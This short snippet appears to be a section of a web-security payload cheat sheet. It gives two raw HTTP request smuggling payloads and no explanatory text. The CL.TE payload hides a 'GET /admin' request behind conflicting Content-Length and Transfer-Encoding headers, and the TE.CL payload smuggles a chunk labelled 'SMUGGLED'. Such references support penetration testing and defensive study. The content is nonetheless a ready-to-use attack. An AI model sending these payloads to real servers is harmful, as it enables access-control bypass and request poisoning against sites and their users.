### CL.TE vulnerabilities
```
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /admin HTTP/1.1
Host: domain.com
```

### TE.CL vulnerabilities
```
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0\r\n\r\n
```
